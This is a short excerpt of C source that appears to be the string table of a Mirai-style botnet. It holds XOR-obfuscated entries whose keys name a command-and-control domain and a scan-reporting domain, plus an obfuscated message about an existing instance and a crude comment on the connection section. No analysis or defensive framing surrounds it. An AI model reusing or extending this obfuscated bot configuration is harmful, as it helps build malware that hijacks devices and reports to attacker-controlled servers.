...
{   
    ...
    add_entry(TABLE_INSTANCE_EXISTS, "\x5E\x6C\x29\x6E\x66\x7D\x29\x7D\x61\x60\x7A\x29\x7A\x61\x60\x7D\x29\x68\x65\x7B\x6C\x68\x6D\x70\x27\x09", 26);
        /* connections shit */
    add_entry(TABLE_CNC_DOMAIN, "\x7D\x7E\x60\x67\x27\x73\x7C\x24\x64\x64\x27\x6A\x66\x64\x09", 15);
    add_entry(TABLE_SCAN_DOMAIN, "\x7A\x7D\x68\x7D\x6C\x27\x73\x7C\x24\x64\x64\x27\x6A\x66\x64\x09", 16);
